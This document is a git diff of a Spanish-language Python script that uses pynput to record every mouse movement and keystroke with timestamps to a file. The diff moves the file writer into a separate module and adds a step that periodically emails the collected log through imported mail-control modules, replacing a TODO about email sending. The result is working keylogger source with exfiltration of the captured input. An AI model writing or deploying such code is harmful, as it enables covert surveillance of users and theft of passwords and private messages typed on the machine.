@@ -1,18 +1,9 @@
 from pynput import mouse,keyboard
 import threading
 from time import time
-
-t_inicial=time()
-
-def escribir(dispositivo, accion, t_final, colocacion):
-    global t_inicial
-    n_archivo="lista_acciones.txt"
-    archivo=open(n_archivo,"a")
-    tiempo=round(t_final-t_inicial,2)
-    archivo.write(dispositivo + "," + accion + "," + str(tiempo) + "," + colocacion + "\n")
-    archivo.close()
-    t_inicial = time()
-
+from Archivo import escribir
+from Conntrol_correo import actualizar_mes, enviar
+from Correo import enviar_correo
 
 def on_move(x, y):
     colocacion = ('{0},{1}'.format(x, y))
@@ -39,6 +30,10 @@ def on_release(key):
         escribir("Keyboard", "Release", time(), str(key))
 
 
+if enviar():
+    actualizar_mes()
+    enviar_correo()
+
 listener_keyboard= keyboard.Listener(
         on_press=on_press,
         on_release=on_release)
@@ -59,5 +54,3 @@ for hilo in threading.enumerate(): # Recorre hilos activos para controlar estado
     if hilo is hilo_ppal:    # Si el hilo es hilo_ppal continua al siguiente hilo activo
         continue
     hilo.join()         # El programa esperará a que este hilo finalice:
-
-#TODO: falta configurar el envio al correo electronico
